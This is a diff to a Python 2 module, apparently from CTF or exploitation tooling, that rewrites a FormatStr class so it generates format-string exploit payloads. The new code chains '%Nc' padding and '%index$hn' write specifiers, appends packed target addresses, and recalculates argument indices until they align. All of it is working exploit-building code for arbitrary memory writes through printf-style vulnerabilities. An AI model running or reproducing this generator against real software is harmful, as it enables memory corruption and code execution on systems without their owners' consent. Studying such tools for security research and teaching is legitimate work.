@@ -4,6 +4,13 @@
 import sys
 import struct
 
+#TODO: sometimes %xx$n is enough
+#TODO: sometimes address is better when not aligned (e.g. to avoid null bytes)
+#TODO: add word() class - to set shorts (dword by default)
+#TODO: function to make patterns with fill up to N bytes to search argnumber
+#TODO: @start_len param is for cases when you can't change the printed data
+#      so there should be a param for the other case (padding in other words)
+
 class FormatStr:
     def __init__(self):
         self.tuples = []
@@ -57,20 +64,43 @@ class FormatStr:
     def payload(self, arg_index, start_len=0):
         self.sort()
 
-        payload = ""
-        for addr, value in self.tuples:
-            payload += struct.pack("<I", addr)
+        prev_len = -1
+        index = arg_index * 10000  # enough for sure
+        while True:
+            payload = ""
+            addrs = ""
+            printed = start_len
 
-        printed = len(payload) + start_len
-        index = arg_index
-        for num in range(len(self.tuples)):
-            print_len = self.tuples[num][1] - printed
-            if print_len:
-                payload += "%" + str(print_len) + "c"
-            payload += "%" + str(index) + "$hn"
-            printed += print_len
-            index += 1
+            for addr, value in self.tuples:
+                print_len = value - printed
+                if print_len > 2:
+                    payload += "%" + str(print_len) + "c"
+                elif print_len >= 0:
+                    payload += "A" * print_len
+                else:
+                    self.warning("Can't write a value %08x (too small)." % value)
+                    continue
+
+                payload += "%" + str(index) + "$hn"
+                addrs += struct.pack("<I", addr)
+                printed += print_len
+                index += 1
+            
+            payload += "A" *  (-len(payload) % 4)  # align 4 bytes
+            
+            if len(payload) == prev_len:
+                payload += addrs  # argnumbers are set right
+                break
+
+            prev_len = len(payload)
+            index = arg_index + len(payload) // 4
+
+        if "\x00" in payload:
+            self.warning("Payload contains NULL bytes.")
         return payload
+    
+    def warning(self, s):
+        print >>sys.stderr, "WARNING:", s
 
 def tuples_sorted_by_values(adict):
     """Return list of (key, value) pairs of @adict sorted by values."""
